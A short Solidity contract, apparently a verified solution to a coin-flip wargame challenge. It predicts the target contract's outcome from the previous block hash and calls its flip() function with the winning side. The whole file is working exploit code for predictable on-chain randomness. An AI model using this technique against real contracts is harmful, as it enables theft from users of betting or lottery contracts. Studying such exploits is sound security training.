/**
 *Submitted for verification at Etherscan.io on 2022-10-18
*/

// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity >=0.8.0;

interface CoinFlip {
    function flip(bool) external returns (bool);
}

contract Flip {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address target = 0xefCe94423d07D005149d98d9A8B5F13179DBf284;
    bool guess;

    CoinFlip flipContract = CoinFlip(target);

    function hackFlip() external {
        uint256 blockValue = uint256(blockhash(block.number - (1)));
        uint256 coinFlip = blockValue / (FACTOR);
        bool side = coinFlip == 1 ? true : false;
        require(flipContract.flip(side), "got the wrong flip");
    }
}